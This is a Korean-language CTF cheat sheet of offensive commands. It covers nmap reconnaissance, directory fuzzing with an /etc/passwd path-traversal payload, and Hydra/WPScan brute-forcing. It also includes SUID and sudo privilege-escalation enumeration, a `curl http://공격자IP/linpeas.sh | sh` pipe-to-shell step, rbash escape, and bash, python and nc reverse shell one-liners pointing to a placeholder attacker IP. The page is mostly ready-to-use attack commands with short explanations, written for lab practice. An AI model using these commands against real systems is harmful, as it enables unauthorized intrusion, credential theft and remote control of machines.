## 🗺️ CTF 필수 명령어 총정리

---

### 📡 1. 정찰 (Reconnaissance)

```bash
# 네트워크에서 살아있는 호스트 찾기
nmap -sn 192.168.1.0/24

# 전체 포트 + 서비스 + 스크립트 스캔
nmap -sC -sV -Pn -p- 192.168.1.100

# 결과를 파일로 저장
nmap -sC -sV -Pn -p- 192.168.1.100 -oN scan.txt
```

---

### 🕷️ 2. 웹 디렉토리 열거 (Fuzzing)

```bash
# gobuster 기본
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 확장자 포함
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,log,bak -t 80 --no-error

# dirb (간단 버전)
dirb http://target.com

# ffuf — 숨겨진 파라미터 찾기 (LFI/SQLi 취약점 발굴용)
# FUZZ 자리에 wordlist 단어를 하나씩 넣어서 파라미터명을 브루트포스
ffuf -u "http://target.com/index.php?FUZZ=../../../../etc/passwd" \
  -w /usr/share/wordlists/dirb/common.txt -fs 0
```

> 💡 `-fs 0` : 응답 크기가 0바이트인 결과 필터링 (빈 응답 제거)

---

### 🔑 3. 패스워드 공격

```bash
# CeWL로 사이트 맞춤 wordlist 생성
cewl http://target.com -w wordlist.txt

# WPScan WordPress 브루트포스
wpscan --url http://target.com -U users.txt -P wordlist.txt --password-attack wp-login

# WordPress 사용자 열거
wpscan --url http://target.com -e u

# Hydra SSH 브루트포스
hydra -l admin -P wordlist.txt ssh://192.168.1.100

# John the Ripper 해시 크랙
john hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### 📁 4. 파일 & 사용자 탐색

```bash
# 로그인 가능한 사용자 확인
cat /etc/passwd | grep bash

# 특정 사용자 소유 파일 전체 탐색
find / -user username -type f -exec ls -al {} \; 2>/dev/null

# SUID 비트 설정된 파일 찾기 (권한상승 힌트)
find / -perm -4000 -type f 2>/dev/null

# 쓰기 가능한 디렉토리 찾기
find / -writable -type d 2>/dev/null

# sudo 권한 확인 (권한상승 핵심!)
sudo -l
```

---

### 🚀 5. 권한 상승 자동화 (LinPEAS)

> `sudo -l`이나 SUID에서 힌트가 없을 때 LinPEAS로 자동 진단

```bash
# [공격자 머신] linpeas.sh 있는 디렉토리에서 웹 서버 열기
python3 -m http.server 80

# [타겟 쉘] 디스크에 저장 없이 메모리에서 바로 실행
curl http://공격자IP/linpeas.sh | sh
```

> 💡 LinPEAS 다운로드: https://github.com/carlospolop/PEASS-ng

---

### 🐚 6. 쉘 탈출 & 업그레이드

```bash
# rbash 탈출 (vi 이용)
vi
  :set shell=/bin/sh
  :shell

# PATH / SHELL 환경 복구
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash

# python으로 기본 bash 업그레이드
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
```

**완전한 인터랙티브 쉘로 업그레이드 (TTY 풀 세션):**

```bash
# 1. 타겟 쉘에서
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Ctrl + Z  (쉘을 백그라운드로 잠시 보냄)

# 3. 내 칼리 터미널에서
stty raw -echo; fg

# 4. 엔터 두 번 후 타겟 쉘에서
export TERM=xterm
```

> 💡 왜 쓰나? 기본 리버스 쉘은 화살표키, Ctrl+C, vi 등이 안 됨.
> TTY 업그레이드 후엔 **진짜 터미널처럼** 사용 가능

---

### 🔗 7. 리버스 쉘

```bash
# 공격자 머신에서 리스너 열기
nc -lvnp 4444

# 타겟에서 연결 (bash)
bash -i >& /dev/tcp/공격자IP/4444 0>&1

# 타겟에서 연결 (python)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("공격자IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'

# nc로 연결
nc -e /bin/bash 공격자IP 4444
```

---

### 🔐 8. 해시 & 인코딩

```bash
# base64 디코딩
echo "인코딩된문자열" | base64 -d

# base64 인코딩
echo "텍스트" | base64

# 해시 종류 확인
hash-identifier
```

---

### 🌐 9. FTP / SSH

```bash
# FTP 익명 로그인
ftp 192.168.1.100 [포트]
# Name: anonymous / Password: 엔터

# FTP 파일 다운로드
ftp> get 파일명

# SSH 접속
ssh user@192.168.1.100
ssh user@192.168.1.100 -p 포트번호
```

---

### 🔖 북마크 필수 사이트

| 사이트 | 용도 |
|--------|------|
| [GTFOBins](https://gtfobins.github.io) | 쉘 탈출 / sudo 권한상승 방법 모음 |
| [RevShells](https://www.revshells.com) | 리버스 쉘 원클릭 생성 |
| [CrackStation](https://crackstation.net) | 온라인 해시 크랙 |
| [HackTricks](https://book.hacktricks.xyz) | CTF 기법 백과사전 |
| [PEASS-ng](https://github.com/carlospolop/PEASS-ng) | LinPEAS 권한상승 자동 스크립트 |
